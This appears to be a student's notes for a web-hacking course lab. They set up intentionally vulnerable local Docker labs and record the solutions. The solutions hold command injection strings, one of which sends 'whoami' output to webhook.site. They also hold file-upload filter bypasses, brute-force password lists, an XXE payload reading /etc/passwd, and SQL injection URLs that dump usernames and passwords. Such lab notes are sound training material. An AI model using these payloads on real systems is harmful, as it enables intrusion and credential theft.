# Web App Lab Setup

> **Lab Requirements**
>
> - 1 Kali Linux VM
> - [pimpmykali](https://github.com/Dewalt-arch/pimpmykali/blob/master/pimpmykali.sh)
>   - (optional) [peh-web-labs.tar.gz](https://cdn.fs.teachablecdn.com/CbIyLkOuS4GUH7TNFTFg)
> - [Burp Suite](https://portswigger.net/burp/releases)

- Run `pimpmykali.sh` with `E` selection for **PEH Course WebApp Labs**

```bash
# Clone a Github repository in the "/opt" dir
cd /opt
sudo rm -rf pimpmykali/
sudo git clone https://github.com/Dewalt-arch/pimpmykali

sudo /opt/pimpmykali/pimpmykali.sh
# Run menu option E for the WebApp Labs
# The labs start automatically

# To START the labs
cd $HOME/peh/labs
./start-peh-labs.sh

# To (only) STOP the labs
sudo docker stop $(sudo docker ps -aq)

# To STOP and CLEANUP the labs
cd $HOME/peh/labs
./cleanup-peh-labs.sh
# This script removes ALL DOCKER CONTAINERS and NETWORKS!!!
```

- Run Burp Suite and open its proxy browser
- Browse to `http://localhost`
- The database can be initialized/reset at `http://localhost/init.php`

---

> # Lab solutions
>
> ## Command Inj 0x02
>
> `https://tcm-sec.com/& whoami& asd`
>`https://tcm-sec.com/ | sleep 10 | asd`
> 
>`https://webhook.site/<id>/?`whoami``
> 
> ## Command Inj 0x03
> 
> `45123)^2))}';whoami;#`
> 
>## File upload 0x01
> 
>- Intercept
> - Change contents
> - Or turn off JS
> 
> ## File upload 0x02
>
> - Bypass the client-side again
>- Intercept and change the content-type to image/png or image/jpeg
> 
>## File upload 0x03
> 
>- Bypass the client-side again
> - Intercept and change the content-type again
>- Use an extension that's not in the blocklist (.phtml)
> 
>## Authentication 0x01
> 
>- Brute force
> 
>## Authentication 0x02
> 
>- MFA code, switch username (code is OK for all users)
> - Or, just brute the code
>
> ## Authentication 0x03
> 
>- Account lockout after 5 attempts, therefore brute the top 4 passwords against a username list
> 
>- common password list:
> 
> ```
>password
> password123
>letmein
> manchesterunited
>```
> 
>- common usernames list: `/usr/share/seclists/Usernames/Names/names.txt`
> 
>## XXE, IDOR, capstone
> 
> ### XXE 0x01
> 
>```
> <?xml version="1.0" encoding="UTF-8"?>
><!DOCTYPE creds [
> <!ELEMENT creds ANY >]>
> <creds><user>username</user><password>pass</password></creds>
>```
> 
>```
> <?xml version="1.0" encoding="UTF-8"?>
> <!DOCTYPE creds [
> <!ELEMENT creds ANY >
><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
> <creds><user>&xxe;</user><password>pass</password></creds>
>```
> 
>### IDOR
> 
>`fuzz the parameter`
> 
> - find an admin user (or all of the admin users)
>
> ### Capstone
>
> SQLi to get into admin panel
>File upload to get RCE
> 
>- XSS in the message alert
> - XSS in account names probably? need to test
> 
> - brute force user accounts
> 
> - SQLi on adding rating
> 
>`http://localhost/capstone/coffee.php?coffee=3' or 1=1-- -`
> 
>`http://localhost/capstone/coffee.php?coffee=1%27%20union%20select%20null,username,password,null,null,null,null%20from%20users--%20-`
> 
># To do list
> 
>- file upload capstone
> - auth0x03 testing